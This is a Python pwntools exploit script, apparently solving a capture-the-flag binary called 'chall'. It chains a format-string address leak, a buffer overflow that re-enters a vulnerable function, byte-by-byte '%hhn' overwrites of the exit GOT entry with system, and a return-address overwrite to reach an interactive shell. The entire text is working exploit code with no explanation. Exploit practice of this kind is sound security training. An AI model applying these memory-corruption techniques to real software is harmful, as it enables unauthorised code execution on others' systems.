#!/usr/bin/python3

from pwn import *

exe = ELF('chall', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*fmt+93
                b*main+130
                b*fmt+126
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()

sa(b"fmt", b"%17$p")
p.recvline()
exe_leak = int(p.recv(14), 16)
exe.address = exe_leak - exe.sym['main']
info("exe leak: " + hex(exe.address))
sa(b"8==D", b"a"*72 + p64(exe.sym['fmt']+5))


sla(b"?????", b"%17$p")
p.recvline()
stack_leak = int(p.recvline(keepends = False), 16)
info("stack leak: " + hex(stack_leak))
ret = stack_leak - 0x100
info("ret: " + hex(ret))

plt_system = exe.plt['system']
got_exit = exe.got['exit']

info("got exit: " + hex(got_exit))
info("plt system: " + hex(plt_system))
for i in range(0,6):
        info("" + str(i))
        payload = f"%{plt_system & 0xff}c%8$hhn".encode().ljust(16,b"\0") + p64(got_exit)
        sla(b"?????", payload)
        plt_system = plt_system >> 8
        got_exit+= 1
nowin = exe.sym['exit_f'] + 5
for i in range(0, 6):
        payload = f"%{nowin & 0xff}c%8$hhn".encode().ljust(16, b"\0") + p64(ret)
        sla(b"?????", payload)
        nowin = nowin >> 8
        ret += 1
sl(b"a"*15) # cố tình gây lỗi để thực thi return 

p.interactive()
